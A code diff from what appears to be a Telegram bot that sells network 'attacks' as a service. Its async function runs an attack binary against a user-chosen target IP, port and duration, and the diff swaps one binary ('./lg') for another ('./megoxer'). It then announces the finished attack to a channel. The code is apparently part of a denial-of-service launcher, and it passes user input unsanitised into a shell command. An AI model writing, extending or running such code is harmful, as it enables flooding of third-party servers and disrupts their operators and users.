@@ -165,7 +165,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"./lg {target_ip} {target_port} {duration} 900"
+        command = f"./megoxer {target_ip} {target_port} {duration}"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 ™")
